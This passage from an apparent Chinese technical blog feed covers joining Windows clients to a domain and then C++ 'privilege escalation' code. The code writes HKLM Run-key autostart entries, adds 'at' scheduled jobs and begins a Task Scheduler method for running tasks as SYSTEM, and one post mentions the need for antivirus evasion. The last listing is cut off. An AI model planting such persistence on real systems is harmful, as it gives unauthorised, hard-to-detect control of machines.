src="/12.jpg"></p><p>此计算机-&gt;属性-&gt;系统属性-&gt;计算机名&#x2F;域更改-&gt;选择域，填入域名，之后登陆刚刚添加的域用户账号，弹出欢迎加入域，即配置成功</p><p><img src="/13.jpg"></p><p>遇到XP客户机加入域的问题：加入域显示不能访问网络位置。<br>要解决此问题，请启动 TCP&#x2F;IP NetBIOS 支持服务，然后加入域。<br>要启动 NetBIOS 支持服务，请按照下列步骤操作：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 使用具有管理员权限的帐户登录到客户机。</span><br><span class="line">2. 单击“开始”，单击“运行”，在“打开”框中键入 services.msc，然后单击“确定”。</span><br><span class="line">3. 在服务列表中，双击“TCP<span class="built_in">/IP </span>NetBIOS Helper Service”。</span><br><span class="line">4. 在“启动类型”列表中，单击“自动”，然后单击“应用”。</span><br><span class="line">5. 在“服务状态”下，单击“启动”以启动 TCP<span class="built_in">/IP </span>NetBIOS 支持服务。</span><br><span class="line">6. 当该服务启动后，请单击“确定”，然后退出“服务”管理单元。</span><br></pre></td></tr></table></figure><p><img src="/14.jpg"></p><p>然后继续配置域名，登陆域账号，即可加入成功</p><p><img src="/15.jpg"></p><p>剩下的机器按照以上配置即可，逐个加入域</p><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><p><a href="http://blog.sina.com.cn/s/blog_625999850102vpqa.html" target="_blank" rel="noopener">XP客户机加入域的问题</a></p>]]></content>
      
      
      <categories>
          
          <category> 域控安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++提权的几种方式(win)(二)</title>
      <link href="/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/"/>
      <url>/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>书接上回嘿嘿</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：注册表是什么?</b></p><p>A：注册表实际上是一个管理配置系统运行参数的核心数据库，它记录了安装软件与运行程序的关联关系，计算机的硬件配置等信息。可以说计算机上所有针对硬件、软件、网络的操作都是源于注册表的。可以使用 regedit.exe 这个系统提供的注册表编辑器去管理编辑注册表。</p><hr><h1 id="C-写入注册表启动项"><a href="#C-写入注册表启动项" class="headerlink" title="C++ 写入注册表启动项"></a>C++ 写入注册表启动项</h1><p><b>注意：需要重启才能重新加载注册表，这边写入的是开机自启动的注册表，代码中的刷新功能没成功（还有别的刷新注册表的方式，这边没有再去做其他尝试）。并且需要注意64与32位注册表的不同。</b></p><blockquote><p>以下尝试的几种刷新方法：</p></blockquote><ul><li>SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0); &#x2F;&#x2F;利用消息发送函数向WINDOWS发送刷新注册表的消息</li><li>PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL); &#x2F;&#x2F;模拟F5刷新</li><li>SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE); &#x2F;&#x2F;通过给第一个参数传入一个SET属性的参数可以实现部分系统刷新功能</li><li>SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L”Environment”, SMTO_ABORTIFHUNG, 3000, NULL); &#x2F;&#x2F;&#x2F;&#x2F;通知所有打开的程序注册表已修改</li></ul><blockquote><p>SendMessageTimeout与SendMessage有什么不同？</p></blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">SendMessage</span> : 如果指定窗口由调用线程创建，那么窗口过程会被当成一个子程序立即调用。如果指定窗口由另外一个线程创建，那么系统会切换到那个线程，并且调用合适的窗口过程。在线程之间传递的消息仅仅当接收线程执行<span class="variable">message</span> <span class="variable">retrieval</span> <span class="variable">code</span>才会被处理。发送线程会被堵塞直到接收线程处理完消息。但是，发送线程在等待的同时会处理收到的<span class="variable">nonqueued</span> <span class="variable">messages</span>。为了阻止这一点，使用带有<span class="variable">SMTO_BLOCK</span>参数的<span class="variable">SendMessageTimeout</span>。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">SendMessage</span>()在目标线程从其消息队列中检索到消息，然后以完整或调用的方式处理消息之前，不会退出<span class="title">ReplyMessage</span>()释放<span class="title">SendMessage</span>()同时继续处理消息。所以，如果<span class="title">SendMessage</span>()它意味着目标线程没有处理它的消息队列，这很好地表明目标线程可能在等待其他消息时处于死锁状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用<span class="title">SendMessageTimeOut</span>()，我们可以设置一个等待时间。一般情况下，这个消息应该会在这个时间会返回，但异常情况就通过这个<span class="variable">TIME</span>来帮助我们返回，从而知道对象的线程挂起而避免自己被挂起。</span></span><br></pre></td></tr></table></figure><p><b>64位的</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regedit</span><span class="params">(HKEY key, <span class="keyword">const</span> <span class="keyword">char</span>* reg_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hkResult;</span><br><span class="line"><span class="keyword">int</span> ret = RegOpenKeyEx(key, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkResult);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ret = RegSetValueEx(hkResult, key_name, <span class="number">0</span>, REG_EXPAND_SZ, (CONST BYTE*)key_value, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">RegCloseKey(hkResult);</span><br><span class="line">SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, <span class="number">0</span>, (LPARAM)<span class="string">L"Environment"</span>, SMTO_ABORTIFHUNG, <span class="number">3000</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//下面是刷新的几种方法，都没成功</span></span><br><span class="line">        <span class="comment">//SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0);</span></span><br><span class="line"><span class="comment">//PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETANIMATION, sizeof(ANIMATIONINFO), &amp;info, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">autopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* process_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line"><span class="keyword">return</span> regedit(HKEY_LOCAL_MACHINE, reg_name, key_name, process_path);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> key_name;</span><br><span class="line"><span class="built_in">string</span> process_path;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"注册项名称 文件路径\n"</span>;</span><br><span class="line">getline(<span class="built_in">cin</span>, key_name);</span><br><span class="line">getline(<span class="built_in">cin</span>, process_path);</span><br><span class="line"><span class="comment">//cout &lt;&lt; process_path;</span></span><br><span class="line"><span class="keyword">int</span> ret = autopen(key_name.c_str(), process_path.c_str());</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register succeed\n"</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"错误响应码：%d\n"</span>, ret);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><b>x86</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line">LPCTSTR lpSubKey = reg_name;</span><br><span class="line">HKEY hKey;</span><br><span class="line">REGSAM flag = KEY_WOW64_64KEY; <span class="comment">//判断是否为64位</span></span><br><span class="line">DWORD dwDisposition = REG_OPENED_EXISTING_KEY;</span><br><span class="line">LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS | flag, &amp;hKey);</span><br><span class="line"><span class="comment">//LONG lRet = ::RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, NULL, NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS, NULL, &amp;hKey, &amp;dwDisposition);  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> setPath[]= <span class="string">"C:\\Windows\\system32\\cmd.exe"</span>;</span><br><span class="line">TCHAR* pchrName = setPath;</span><br><span class="line">lRet = ::RegSetValueEx(hKey, TEXT(<span class="string">"TEST"</span>), <span class="literal">NULL</span>, REG_SZ, (LPBYTE)pchrName, <span class="number">100</span>); <span class="comment">//设置注册表项  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">::RegCloseKey(hKey); <span class="comment">//与RegCreateKeyEx配对写 </span></span><br><span class="line">PostMessage(HWND_BROADCAST, WM_COMMAND, <span class="number">41504</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="利用CMD命令行创建计划任务"><a href="#利用CMD命令行创建计划任务" class="headerlink" title="利用CMD命令行创建计划任务"></a>利用CMD命令行创建计划任务</h1><p><b>CMD 命令行下有两个命令可以创建计划任务，一个是at，另一个是schtasks。</b></p><ul><li>at 命令仅在 Win7 及以下系统有效，支持指定任务的执行时间，支持远程创建计划任务，但不能指定任务在系统启动或用户登录时启动。与schtasks命令相比，其优势是创建计划任务所需的命令比较简单。</li><li>schtasks支持 Windows 全系列系统，与at命令相比，可设置的选项更加丰富，能适应更多的应用场景，同时还允许指定任务在系统启动、用户登录甚至是系统闲置时间启动。</li></ul><p><b>缺点：at只能在windows7-以及windows 2008以下系统运行。并且调用at、sc等去做计划任务的话，容易被杀软监测到。效率比较低，可能得做好免杀。</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是at的计划任务</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmcons.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmat.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"netapi32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///计划任务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Jobadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD JobId, ret;</span><br><span class="line">    AT_INFO ai;</span><br><span class="line">    <span class="built_in">string</span> filepath;</span><br><span class="line">    <span class="built_in">string</span> RootPath;</span><br><span class="line">    <span class="built_in">string</span> Rootapp;</span><br><span class="line">    <span class="keyword">long</span> Len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; RootPath;</span><br><span class="line">    WCHAR szFilePath[<span class="number">100000</span>];</span><br><span class="line">    <span class="comment">//GetSystemDirectory(&amp;RootPath[0], MAX_PATH);</span></span><br><span class="line">    filepath = RootPath;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Rootapp;</span><br><span class="line">    filepath += Rootapp;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;ai, <span class="number">0</span>, <span class="keyword">sizeof</span>(ai));</span><br><span class="line">    Len = MultiByteToWideChar(CP_ACP, <span class="number">0</span>, filepath.c_str(), <span class="built_in">strlen</span>(filepath.c_str()), szFilePath, <span class="keyword">sizeof</span>(szFilePath));</span><br><span class="line">    szFilePath[Len] = <span class="string">'\0'</span>;</span><br><span class="line">    ai.Command = szFilePath;</span><br><span class="line">    ai.DaysOfMonth = <span class="number">0</span>;</span><br><span class="line">    ai.DaysOfWeek = <span class="number">0x7F</span>; <span class="comment">//7F等于二进制的7个1，就是每周的7天全部运行  </span></span><br><span class="line">    ai.Flags = JOB_RUN_PERIODICALLY;</span><br><span class="line">    ai.JobTime = <span class="number">22</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> + <span class="number">21</span> * <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">//22点21分，这里是以毫秒为单位的，所以需要乘这些值  </span></span><br><span class="line">    ret = NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ret &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//if (ret == ERROR_SUCCESS)</span></span><br><span class="line">      <span class="comment">//  std::cout &lt;&lt; " SUCCESS!!" &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//else</span></span><br><span class="line">     <span class="comment">//   std::cout &lt;&lt; "Error" &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    Jobadd();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_38777624/article/details/109217325" target="_blank" rel="noopener">Windows 注册表相关API总结</a></p><p><a href="https://www.cxymm.net/article/yurnero123/41080367" target="_blank" rel="noopener">几个修改注册表后立即生效的刷新方法</a></p>]]></content>
      
      
      <categories>
          
          <category> win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++提权的几种方式(win)(一)</title>
      <link href="/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了&#x3D; &#x3D;</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：Task schduler是什么?</b></p><p>A：Task schduler：任务调度程序，可以理解他的作用跟 Linux 下的 Crontab 作用类似，但是要比 Linux Crontab 强大很多。不单单可以执行定时任务，还可以根据某些特定的条件来启动其他应用，发送电子邮件等任务。</p><p><b>Q：为什么提的权限要是SYSTEM账户?</b></p><p>A：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和 Windows 进程须要可以在内部登录（比如在 Windows 安装过程中）而系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。</p><p>在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM 账户，是不须要输入密码的。如果使用了其他管理员账户，我们必须输入密码。一般我们使用系统账户，主要是为了防止管理员改变密码后任务无法运行。</p><hr><p><b>关于计划任务的设定，可以参考这篇文章<a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/security-contexts-for-running-tasks" target="_blank" rel="noopener">任务的安全上下文</a>，例如 Administrators 组或 SYSTEM 帐户的成员可以读取、更新、删除和运行任何任务。 “用户”组、LocalService 帐户和 NetworkService 帐户的成员只能读取、更新、删除和运行已创建的任务。</b></p><hr><h1 id="C-Task-Scheduler-2-0提权"><a href="#C-Task-Scheduler-2-0提权" class="headerlink" title="C++ Task Scheduler 2.0提权"></a>C++ Task Scheduler 2.0提权</h1><h3 id="注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。"><a href="#注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。" class="headerlink" title="注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。"></a>注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"taskschd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"comsupp.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"credui.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM</span></span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_MULTITHREADED);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nCoInitializeEx failed: %x"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册安全性并设置该过程的默认安全性值。</span></span><br><span class="line">    hr = CoInitializeSecurity(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">-1</span>,</span><br><span class="line">        <span 